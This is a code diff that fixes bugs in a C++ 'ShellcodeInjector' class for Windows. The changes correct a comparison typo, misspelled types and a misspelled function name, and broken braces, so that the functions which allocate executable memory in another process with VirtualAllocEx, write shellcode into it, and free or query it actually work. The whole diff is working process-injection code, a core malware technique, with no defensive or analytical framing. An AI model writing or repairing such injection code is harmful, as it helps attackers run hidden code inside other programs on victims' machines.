@@ -10,34 +10,34 @@ class ShellcodeInjector
     public:
          static LPVOID AllocateRemoteMemory(HANDLE hProcess,size_t size)
          {
-            if(hProcess==nullptr || hProcess=INVALID_HANDLE_VALUE)
+            if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE)
             {
                 Utility::PrintError("Invalid Process Handle");
                 return nullptr;
             }
     
-        if(size==0)
-        {
-            Utility::PrintError("Shellcode size is 0");
-            return nullptr;
-        }
-        LPVOID remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-        if(!remoteMem)
-        {
-            Utility::PrintError("VirtualAllocEx failed:" + Utility::GetLastErrorString());
-
-            remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READ);
-            if(!remoteMem)
+            if(size==0)
             {
-                Utility::PrintError("VirtualAllocEx also failed: "+ Utility::GetLastErrorString());
+                Utility::PrintError("Shellcode size is 0");
                 return nullptr;
             }
-        }
-        Utility::PrintSuccess("Allocated "+ to_string(size) + "bytes at 0x" + to_string(reinterpret_cast<uintptr_t>(remoteMem)));
-        return remoteMem;
+            
+            LPVOID remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+            if(!remoteMem)
+            {
+                Utility::PrintError("VirtualAllocEx failed:" + Utility::GetLastErrorString());
 
-
+                remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READ);
+                if(!remoteMem)
+                {
+                    Utility::PrintError("VirtualAllocEx also failed: "+ Utility::GetLastErrorString());
+                    return nullptr;
+                }
+            }
+            Utility::PrintSuccess("Allocated "+ to_string(size) + "bytes at 0x" + to_string(reinterpret_cast<uintptr_t>(remoteMem)));
+            return remoteMem;
          }
+
          static bool WriteShellcode(HANDLE hProcess,LPVOID remoteAddr,const BYTE* shellcode,size_t size)
          {
             if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
@@ -76,7 +76,7 @@ class ShellcodeInjector
 
          static bool FreeRemoteMemory(HANDLE hProcess,LPVOID remoteAddr)
          {
-           if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
+            if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
             {
                 Utility::PrintError("Invalid process handle");
                 return false;
@@ -89,42 +89,41 @@ class ShellcodeInjector
 
             BOOL success=VirtualFreeEx(hProcess,remoteAddr,0,MEM_RELEASE);
             
-                if(!success)
-                {
-                    Utility::PrinteError("Virtual Free Ex failed " + Utility::GetLastErrorString());
-                    return false;
-                }
-         }
-                Utility::PrintSuccess("Memory free at 0x " + to_string(reinterpret_cast<uintptr_t>(remoteAddr)));
-                return true;
-            
-            static LPVOID AllocateAndWriteShellcode(HANDLE hProcess, const BYTE* shellcode,size_t size)
+            if(!success)
             {
-                  LPVIOD remoteMem=AllocateRemoteMemory(hProcess,size);
-                  if(!remoteMem)
-                  {
-                    return nullptr;
-                  }
-
-                  if(!WriteShellcode(hProcess,remoteMem,shellcode,size))
-                  {
-                    FreeRemoteMemory(hProcess,remoteMem);
-                    return nullptr;
-                  }
-                  return remoteMem;
-            }
-
-            static bool Ismemoryexecutable(HANDLE hProcess,LPVIOD addr)
-            {
-               MEMORY_BASIC_INFORMATION mbi;
-               SIZE_T result=VirtualQueryEx(hProcess , addr, &mbi,sizeof(mbi));
-
-               if(result==0)
-               {
+                Utility::PrintError("Virtual Free Ex failed " + Utility::GetLastErrorString());
                 return false;
-               }
-               return (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |  PAGE_EXECUTE_WRITECOPY | PAGE_EXECUTE_READWRITE)) != 0;
             }
+         
+            Utility::PrintSuccess("Memory free at 0x " + to_string(reinterpret_cast<uintptr_t>(remoteAddr)));
+            return true;
          }
 
-}
+         static LPVOID AllocateAndWriteShellcode(HANDLE hProcess, const BYTE* shellcode,size_t size)
+         {
+            LPVOID remoteMem=AllocateRemoteMemory(hProcess,size);
+            if(!remoteMem)
+            {
+               return nullptr;
+            }
+
+            if(!WriteShellcode(hProcess,remoteMem,shellcode,size))
+            {
+               FreeRemoteMemory(hProcess,remoteMem);
+               return nullptr;
+            }
+            return remoteMem;
+         }
+
+         static bool Ismemoryexecutable(HANDLE hProcess,LPVOID addr)
+         {
+            MEMORY_BASIC_INFORMATION mbi;
+            SIZE_T result=VirtualQueryEx(hProcess , addr, &mbi,sizeof(mbi));
+
+            if(result==0)
+            {
+               return false;
+            }
+            return (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |  PAGE_EXECUTE_WRITECOPY | PAGE_EXECUTE_READWRITE)) != 0;
+         }
+};
